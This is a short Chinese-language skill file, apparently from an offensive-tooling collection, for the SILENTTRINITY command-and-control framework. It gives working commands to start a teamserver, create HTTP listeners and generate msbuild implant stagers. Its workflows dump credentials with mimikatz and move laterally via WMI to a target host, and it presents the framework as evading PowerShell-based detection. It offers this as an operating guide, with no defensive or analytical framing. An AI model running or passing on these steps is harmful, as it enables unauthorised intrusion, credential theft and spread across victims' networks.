---
name: "silenttrinity"
description: ">"
---

# Silenttrinity

*Sourced from killvxk-malskills-zh*

# SILENTTRINITY (ST)

基于 Python 的异步 C2，使用 .NET（Boo）植入程序 — 规避基于 PS 的检测。

## 快速开始

```bash
pip install silenttrinity

# 启动团队服务器
st teamserver 0.0.0.0 password

# 连接客户端
st client wss://127.0.0.1:5000 password

# 创建监听器
listeners new http
listeners start http

# 生成投放器
stagers list
stagers generate msbuild http
```

## 核心命令

| 命令 | 用途 |
|------|------|
| `sessions` | 查看活跃植入程序 |
| `sessions interact <id>` | 进入会话 |
| `modules list` | 可用后渗透模块 |
| `modules use <name>` | 加载模块 |
| `run` | 针对会话执行已加载的模块 |
| `listeners` | 管理 C2 监听器 |
| `stagers` | 生成植入程序 |

## 常用工作流

**凭据转储：**
```
modules use boo/credentials/mimikatz
run
```

**通过 WMI 进行横向移动：**
```
modules use boo/lateral/invoke-wmi
set Target 192.168.1.50
run
```

## 资源文件

| 文件 | 加载时机 |
|------|----------|
| `references/` | 投放器格式与模块列表 |

